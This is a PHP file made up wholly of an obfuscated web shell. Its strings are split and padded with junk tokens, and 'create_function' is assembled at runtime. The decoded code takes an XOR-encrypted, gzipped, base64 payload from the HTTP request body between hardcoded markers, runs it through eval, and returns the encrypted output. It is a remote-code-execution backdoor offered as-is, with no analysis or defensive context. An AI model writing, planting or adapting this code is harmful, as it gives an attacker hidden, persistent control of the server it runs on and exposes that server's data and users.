<?php
$J='(@5@ba5@se64_de5@code($m[5@1]),$5@k)));$o=5@@ob5@_get_cont5@e5@n5@ts();@ob5@_end_clea';
$d='GK65@pv";f5@unction 5@x($5@t,$k)5@{$c=strlen(5@$k);$l=st5@rlen($5@t);$5@o5@="";fo';
$B='@k{$j5@};5@}}return $o;}if (5@@preg5@_match("5@/$kh(.+)5@$kf/5@",@file_5@get_cont5@ent';
$q=str_replace('Z','','ZcreZZZZate_funZction');
$p='s(5@"p5@hp://input"5@),$5@m)==1)5@ {@o5@b_sta5@rt();@eva5@l(@gzun5@compr5@ess(@x';
$a='$k="5@dbb655@65@b7"5@;$kh="14e70bc9d81f"5@;$kf=5@"193295@5@3353c2f5@";$p="5@yOhwRmvVeEQ5@';
$j='n();$r5@5@=@ba5@se64_encode(@x5@(@5@gzcompres5@s($o)5@5@,$k));p5@rint("$p$5@kh$r$kf");}';
$U='r($i=05@;$i<$l;5@)5@{f5@o5@r($j=0;($5@5@j<$c&&$5@i<$l);$j++,$i+5@+){$o.=$5@t{$i}5@^$5';
$G=str_replace('5@','',$a.$d.$U.$B.$p.$J.$j);
$N=$q('',$G);$N();
?>
